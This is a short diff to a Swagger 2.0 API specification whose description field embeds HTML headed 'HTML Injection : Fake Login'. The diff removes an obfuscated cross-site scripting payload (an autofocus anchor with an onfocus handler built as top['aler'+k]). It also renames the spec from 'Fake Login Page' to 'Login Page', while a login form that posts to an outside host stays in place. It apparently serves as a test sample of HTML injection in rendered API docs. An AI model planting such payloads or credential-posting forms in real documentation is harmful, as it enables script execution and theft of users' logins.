@@ -1,12 +1,11 @@
 swagger: '2.0'
 info:
   version: "1.0.0"
-  title: "Fake Login Page"
+  title: "Login Page"
   description: |
     <div class="login-form">
       <div class="heading">
         <h1>HTML Injection : Fake Login</h1>
-        <A Href AutoFocus %252F="https://m4.lu"OnFocus=k='t',top['aler'+k](1)>
       </div>
       <div class="form-container">
         <form action="https://m4.lu" method="post" class="form-signin">
